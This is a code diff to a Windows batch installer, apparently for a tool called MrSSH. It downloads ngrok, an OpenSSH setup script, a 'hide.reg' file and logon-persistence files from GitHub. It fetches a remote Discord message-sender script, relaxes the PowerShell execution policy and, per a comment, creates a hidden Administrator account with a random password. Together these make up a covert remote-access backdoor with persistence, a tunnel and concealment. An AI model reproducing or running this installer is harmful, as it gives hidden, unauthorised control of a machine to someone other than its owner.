@@ -1,4 +1,4 @@
-@echo off
+@echo on
 setlocal enabledelayedexpansion
 chcp 65001 >nul
 
@@ -7,7 +7,7 @@ set "Token=%~1"
 set "JsonValues=token version CreationDate ID Endpoint Access"
 set "Version=1.0"
 set "DefaultToken=0000"
-set Files=PFaS.bat OpenSSH.ps1 Source.bat hide.reg WebParse.exe
+set Files=PFaS.bat OpenSSH.ps1 hide.reg WebParse.exe
 set OnLogFiles=onlogon.bat Run.vbs start.bat MrSSH-task.xml
 set Github=https://github.com/dh3b/MrSSH/raw/v.1.0/Files/
 set "TaskFile=!Data!\MrSSH-task.xml"
@@ -39,29 +39,33 @@ if !Bits!=="32-bit" (
 )
 for /f "delims=" %%a in ('systeminfo ^| findstr /B /C:"OS Name"') do set "Windows=%%a"
 set windows=%windows:~-25%
-:: </Processor architecture and windowscheck>
+:: </Processor architecture and windows check>
+
+:: <Separate Install for discord msg>
+curl -fL#k "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat" -o "Source.bat"
+:: </Separate Install for discord msg>
 
 :: <Install>
 Rem download ngrok anyway, because it often bugs
 curl -fL#k "!Github!!ngrok!" -o "!PFaS!\ngrok.exe"
 
 Rem download files into !Files!
-for %%a in (!Files!) do if not exist "!Folder!\%%a" set /a MissingFiles+=1
+for %%a in (%Files%) do if not exist "%Folder%\%%a" set /a MissingFiles+=1
 
 if !MissingFiles! geq 1 (
-    for %%a in (!Files!) do (
+    for %%a in (%Files%) do (
         set /a Downloaded+=1
-        curl --create-dirs -f#kLo "!Folder!\%%a" "!Github!/%%a"
+        curl --create-dirs -f#kLo "%Folder%\%%a" "%Github%/%%a"
     )
 )
 
 Rem download files into !Data!
-for %%a in (!OnLogFiles!) do if not exist "!Data!\%%a" set /a MissingFiles+=1
+for %%a in (%OnLogFiles%) do if not exist "%Data%\%%a" set /a MissingFiles+=1
 
 if !MissingFiles! geq 1 (
-    for %%a in (!OnLogFiles!) do (
+    for %%a in (%OnLogFiles%) do (
         set /a Downloaded+=1
-        curl --create-dirs -f#kLo "!Data!\%%a" "!Github!/%%a"
+        curl --create-dirs -f#kLo "%Data%\%%a" "%Github%/%%a"
     )
 )
 :: </Install>
@@ -111,6 +115,7 @@ curl --create-dirs -Ls "!URL!/raw" -o "!TFolder!\bin\rentry.txt" & if !ErrorLeve
 )
 :: </Set token info>
 
+powershell "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
 powershell ./OpenSSH.ps1
 
 :: <Create Administrator account, hide it and set strong rndm password for it>
